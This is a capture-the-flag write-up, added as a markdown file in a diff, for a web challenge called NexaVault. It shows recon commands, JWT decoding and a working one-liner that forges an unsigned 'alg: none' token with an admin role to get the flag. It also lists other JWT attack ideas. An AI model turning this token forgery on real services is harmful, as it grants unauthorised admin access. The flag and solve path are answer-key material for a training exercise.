@@ -1,0 +1,185 @@
+---
+title: "[ 04 ] THE ENDPOINT"
+description: "Walkthrough for NexaVault Admin Portal"
+---
+
+---
+## Flag
+---
+
+```text Output
+FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}
+```
+
+## Challenge Summary
+---
+
+Prompt:
+
+```text Output
+NexaVault is an internal credential management portal used by engineering teams.
+
+Only administrators can open the Vault - a restricted area holding classified project data.
+
+You have been given access to create an account. That's it.
+
+https://ctf.fampay.co/famctf/
+```
+
+This was a web auth challenge. A normal user can register, but the vault requires an administrator role.
+
+## Initial Recon
+---
+
+I fetched the app:
+
+```powershell Terminal
+curl.exe -i -L "https://ctf.fampay.co/famctf/"
+```
+
+The app redirected to:
+
+```text Output
+/famctf/login
+```
+
+It also exposed a registration route:
+
+```text Output
+/famctf/register
+```
+
+Why: identify the auth flow and route layout before trying auth bypasses.
+
+## Route Checks
+---
+
+I checked common paths:
+
+```powershell Terminal
+$paths=@('dashboard','vault','admin','api','robots.txt','.env','debug','profile','settings','logout')
+foreach($p in $paths){
+  $u="https://ctf.fampay.co/famctf/$p"
+  $r=curl.exe -i -s -o - -w "`n[[CODE:%{http_code} REDIR:%{redirect_url}]]`n" $u
+  Write-Output "===== $p ====="
+  ($r -split "`n") | Select-Object -First 20
+}
+```
+
+Findings:
+
+```text Output
+/famctf/dashboard -> redirects to login if unauthenticated
+/famctf/admin -> redirects to login if unauthenticated
+/famctf/vault -> 404
+/famctf/logout -> clears nx_access
+```
+
+Why: `/famctf/admin` existed and likely implemented the vault access check.
+
+## Registering A User
+---
+
+I registered a random user and saved cookies:
+
+```powershell Terminal
+$u='user'+(Get-Random)
+$p='Password123!'
+curl.exe -i -s -c nv_cookies.txt -b nv_cookies.txt -L `
+  -d "username=$u&password=$p" `
+  -X POST "https://ctf.fampay.co/famctf/register" `
+  | Out-File -Encoding utf8 nv_register.html
+Get-Content nv_cookies.txt
+```
+
+Cookie:
+
+```text Output
+nx_access=<JWT>
+```
+
+Why: the cookie name and value format suggested a JWT.
+
+## Decoding The JWT
+---
+
+I decoded the cookie locally:
+
+```powershell Terminal
+python -c "import base64,json; tok=open('nv_cookies.txt').read().split('nx_access\t')[1].strip(); print(tok); h,p,s=tok.split('.'); dec=lambda x: base64.urlsafe_b64decode(x+'='*((4-len(x)%4)%4)); print(dec(h)); print(dec(p))"
+```
+
+Decoded header:
+
+```json Data.json
+{"alg":"HS256","typ":"JWT"}
+```
+
+Decoded payload:
+
+```json Data.json
+{"sub":"user1179672242","role":"user"}
+```
+
+Why: the authorization decision likely depended on `role`.
+
+## Confirming Normal User Access
+---
+
+Dashboard:
+
+```powershell Terminal
+curl.exe -i -s -b nv_cookies.txt "https://ctf.fampay.co/famctf/dashboard" | Out-File -Encoding utf8 nv_dashboard.html
+Select-String -Path nv_dashboard.html -Pattern 'href=|Vault|Admin|Restricted|FAM\{|flag|role|Access|Credentials|Project' -Context 0,2
+```
+
+Admin route:
+
+```powershell Terminal
+curl.exe -i -s -b nv_cookies.txt "https://ctf.fampay.co/famctf/admin" | Out-File -Encoding utf8 nv_admin.html
+Select-String -Path nv_admin.html -Pattern 'href=|Vault|Admin|Restricted|FAM\{|flag|role|Access|Credentials|Project|denied' -Context 0,2
+```
+
+Result:
+
+```text Output
+Access Denied
+Administrator clearance is required to access the Vault.
+```
+
+Why: the route was correct; only the role needed bypassing.
+
+## Testing JWT Weaknesses
+---
+
+I tested `alg: none` by changing payload role to admin and leaving an empty signature:
+
+```powershell Terminal
+python -c "import base64,json,subprocess,re; b64=lambda x: base64.urlsafe_b64encode(x).rstrip(b'=').decode(); tok=b64(json.dumps({'alg':'none','typ':'JWT'},separators=(',',':')).encode())+'.'+b64(json.dumps({'sub':'user1179672242','role':'admin'},separators=(',',':')).encode())+'.'; r=subprocess.run(['curl.exe','-s','-i','-H','Cookie: nx_access='+tok,'https://ctf.fampay.co/famctf/admin'],capture_output=True,timeout=20); print(tok); print(re.findall(rb'FAM\\{[^}]+\\}', r.stdout)); open('nv_admin_forged.html','wb').write(r.stdout)"
+```
+
+Output:
+
+```text Output
+FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}
+```
+
+Why: the server accepted unsigned JWTs. This is the classic `alg: none` vulnerability.
+
+## Other Methods That Could Have Worked
+---
+
+- Try weak HS256 secrets with common wordlists if `alg:none` failed.
+- Check for algorithm confusion from RS256 to HS256 if a public key endpoint existed.
+- Look for server-side Flask secret disclosure in debug/config endpoints.
+- Try role parameter pollution during registration, for example `role=admin`, if registration accepted extra fields.
+
+## High-Level Solve Path
+---
+
+1. Register a normal user.
+2. Inspect the auth cookie.
+3. Decode JWT and identify `role: user`.
+4. Confirm `/famctf/admin` is the restricted route.
+5. Forge an unsigned `alg:none` JWT with `role: admin`.
+6. Access `/famctf/admin` and recover the flag.
